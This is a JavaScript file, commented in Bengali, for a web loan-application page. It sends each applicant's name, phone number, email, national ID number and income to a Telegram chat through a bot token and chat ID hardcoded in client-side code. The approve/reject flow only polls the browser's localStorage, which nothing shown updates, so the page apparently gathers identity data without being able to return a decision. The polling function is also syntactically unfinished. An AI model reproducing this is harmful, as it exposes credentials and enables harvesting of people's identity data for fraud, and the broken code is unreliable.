// ======================================
// টেলিগ্রাম হ্যান্ডলার - সম্পূর্ণ ইন্টিগ্রেশন
// ======================================

console.log('%c💬 টেলিগ্রাম হ্যান্ডলার লোড হয়েছে', 'color: #0088cc; font-size: 14px; font-weight: bold;');

// টেলিগ্রাম সেটিংস পান
function getTelegramSettings() {
    // অটোমেটিক সেটিংস - আপনার বটের জন্য এখানে এডিট করুন
    return {
        botToken: '7474203780:AAHXjhHDBh6TT4vZGXNrIYxBHse-Bn4yrAY',
        chatId: '7061318778',
        webhookUrl: ''
    };
}


// টেলিগ্রাম সেটিংস সংরক্ষণ করুন
function saveSettings() {
    // সেটিংস অটোমেটিক্যালি লোড হয় - কোন সংরক্ষণের প্রয়োজন নেই
    const settings = getTelegramSettings();
    
    showSuccessAlert(
        '✓ অটোমেটিক সেটিংস',
        `✅ বট টোকেন লোড হয়েছে\n✅ চ্যাট আইডি লোড হয়েছে\n\nকোডে টোকেন হার্ডকোডেড আছে।`
    );

    setTimeout(() => {
        const modal = bootstrap.Modal.getInstance(document.getElementById('settingsModal'));
        if (modal) modal.hide();
    }, 1500);
}

// টেস্ট মেসেজ পাঠান
function testTelegramConnection() {
    const settings = getTelegramSettings();

    if (!settings.botToken || !settings.chatId) {
        showErrorAlert('সেটিংস প্রয়োজন', 'প্রথমে বট টোকেন এবং চ্যাট আইডি যোগ করুন।');
        return;
    }

    showLoadingDisplay('টেস্টিং', 'টেলিগ্রাম সংযোগ পরীক্ষা করছি...');

    const message = `✅ টেলিগ্রাম বট টেস্ট সফল!\n✓ সময়: ${new Date().toLocaleString('bn-BD')}`;

    fetch(`https://api.telegram.org/bot${settings.botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: settings.chatId,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => {
        hideLoadingDisplay();
        if (data.ok) {
            showSuccessAlert('সফল', '✓ টেস্ট মেসেজ পাঠানো হয়েছে!');
            console.log('টেলিগ্রাম টেস্ট সফল:', data);
        } else {
            showErrorAlert('ত্রুটি', data.description || 'বট টোকেন বা চ্যাট আইডি অবৈধ।');
            console.error('টেলিগ্রাম ত্রুটি:', data);
        }
    })
    .catch(error => {
        hideLoadingDisplay();
        showErrorAlert('ত্রুটি', 'সংযোগ ব্যর্থ: ' + error.message);
        console.error('টেলিগ্রাম API ত্রুটি:', error);
    });
}

// টেলিগ্রামে লোন আবেদন পাঠান
function sendLoanApplicationToTelegram(applicationId, formData, settings) {
    console.log('টেলিগ্রামে পাঠানো হচ্ছে:', applicationId, formData);

    const message = `
📋 <b>🆕 নতুন লোন আবেদন</b>

<b>📌 আবেদন ID:</b> <code>${applicationId}</code>

<b>👤 ব্যক্তিগত তথ্য:</b>
  • <b>নাম:</b> ${formData.fullName}
  • <b>মোবাইল:</b> ${formData.mobileNumber}
  • <b>ইমেইল:</b> ${formData.email}
  • <b>এনআইডি:</b> ${formData.nid}

<b>💰 লোন তথ্য:</b>
  • <b>অনুরোধকৃত টাকা:</b> ৳${formatBanglaNumber(formData.loanAmount)}
  • <b>সময়কাল:</b> ${formData.loanTerm} মাস
  • <b>বার্ষিক আয়:</b> ৳${formatBanglaNumber(formData.annualIncome)}

<b>⏰ তথ্য:</b>
  • <b>আবেদনের সময়:</b> ${formData.submittedAt}

⏳ <b>স্ট্যাটাস:</b> ⚠️ অনুমোদনের জন্য অপেক্ষমাণ
    `;

    const inlineKeyboard = {
        inline_keyboard: [
            [
                {
                    text: '✅ অনুমোদন করুন',
                    callback_data: `approve_${applicationId}`
                },
                {
                    text: '❌ প্রত্যাখ্যান করুন',
                    callback_data: `reject_${applicationId}`
                }
            ]
        ]
    };

    const url = `https://api.telegram.org/bot${settings.botToken}/sendMessage`;
    
    console.log('টেলিগ্রাম API কল:', url);

    return fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: settings.chatId,
            text: message,
            parse_mode: 'HTML',
            reply_markup: inlineKeyboard
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('টেলিগ্রাম রেসপন্স:', data);
        if (data.ok) {
            console.log('✓ টেলিগ্রাম মেসেজ সফলভাবে পাঠানো হয়েছে');
            return true;
        } else {
            console.error('টেলিগ্রাম মেসেজ ব্যর্থ:', data.description);
            return false;
        }
    })
    .catch(error => {
        console.error('টেলিগ্রাম API সংযোগ ত্রুটি:', error);
        return false;
    });
}

// পেন্ডিং আবেদন স্টোর করুন
function storePendingApplication(applicationId, formData) {
    let pendingApplications = JSON.parse(localStorage.getItem('pendingApplications')) || {};
    pendingApplications[applicationId] = {
        ...formData,
        status: 'pending',
        createdAt: new Date().getTime(),
        messageId: null
    };
    localStorage.setItem('pendingApplications', JSON.stringify(pendingApplications));
    console.log('আবেদন সংরক্ষিত:', applicationId);
}

// অনুমোদনের জন্য পোলিং করুন
function pollForApproval(applicationId, loanAmount) {
    console.log('পোলিং শুরু:', applicationId);
    let pollCount = 0;
    const maxPolls = 43200; // 12 ঘন্টা (প্রতি সেকেন্ডে পোল)

    const pollInterval = setInterval(() => {
        pollCount++;

        const pendingApplications = JSON.parse(localStorage.getItem('pendingApplications')) || {};
        const application = pendingApplications[applicationId];

        if (!application) {
            clearInterval(pollInterval);
            hideLoadingDisplay();
            console.log('আবেদন পাওয়া গেল না');
            return;
        }

        if (application.status === 'approved') {
            clearInterval(pollInterval);
            hideLoadingDisplay();
            approveApplication(applicationId, loanAmount, application);
            return;
        }

        if (application.status === 'rejected') {
            clearInterval(pollInterval);
            hideLoadingDisplay();
            rejectApplication(applicationId, application);
            return;
        }

        // সর্বোচ্চ সময়সীমা অতিক্রম করলে
        if (pollCount >= maxPolls) {
            clearInterval(pollInterval);
            hideLoadingDisplay();
            showWarningAlert(
                'সময় শেষ',
                'আপনার আবেদনের জন্য সিদ্ধান্ত পাওয়া যায়নি। পরে আবার চেষ্টা করুন।'
            );
            return;
        }

        // সাইলেন্টলি পোল করুন
        if (pollCount % 10 === 0) {
            console.log(`পোলিং... (${pollCount}s)`);
        }
}

// লোডিং ডিসপ্লে দেখান
function showLoadingDisplay(title = 'লোডিং', message = 'প্রক্রিয়া করছি...') {
    let loadingDiv = document.getElementById('loadingDisplay');
    
    if (!loadingDiv) {
        loadingDiv = document.createElement('div');
        loadingDiv.id = 'loadingDisplay';
        loadingDiv.className = 'position-fixed top-50 start-50 translate-middle';
        loadingDiv.style.cssText = `
            z-index: 10000;
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 50px rgba(0,0,0,0.3);
            text-align: center;
            min-width: 400px;
            backdrop-filter: blur(5px);
        `;
        document.body.appendChild(loadingDiv);
    }

    loadingDiv.innerHTML = `
        <div class="spinner-border text-warning mb-4" role="status" style="width: 50px; height: 50px;">
            <span class="visually-hidden">লোড করছি...</span>
        </div>
        <h5 class="fw-bold text-dark mb-2">${title}</h5>
        <p class="text-muted mb-0">${message}</p>
    `;
    
    loadingDiv.style.display = 'block';
}

// লোডিং ডিসপ্লে লুকান
function hideLoadingDisplay() {
    const loadingDiv = document.getElementById('loadingDisplay');
    if (loadingDiv) {
        loadingDiv.style.display = 'none';
    }
}

// ডকুমেন্ট লোড হলে ইনিশিয়ালাইজ করুন
document.addEventListener('DOMContentLoaded', function() {
    // টেলিগ্রাম সেটিংস লোড করুন
    const settingsModal = document.getElementById('settingsModal');
    if (settingsModal) {
        const settings = getTelegramSettings();
        const botTokenInput = document.getElementById('telegramBotToken');
        const chatIdInput = document.getElementById('telegramChatId');
        const webhookInput = document.getElementById('webhookUrl');

        if (botTokenInput && settings.botToken) {
            botTokenInput.value = settings.botToken;
        }
        if (chatIdInput && settings.chatId) {
            chatIdInput.value = settings.chatId;
        }
        if (webhookInput && settings.webhookUrl) {
            webhookInput.value = settings.webhookUrl;
        }

        console.log('টেলিগ্রাম সেটিংস লোড হয়েছে:', settings.botToken ? '✓' : '✗');
    }
});

console.log('%c✓ টেলিগ্রাম হ্যান্ডলার প্রস্তুত', 'color: #0088cc; font-size: 12px;');
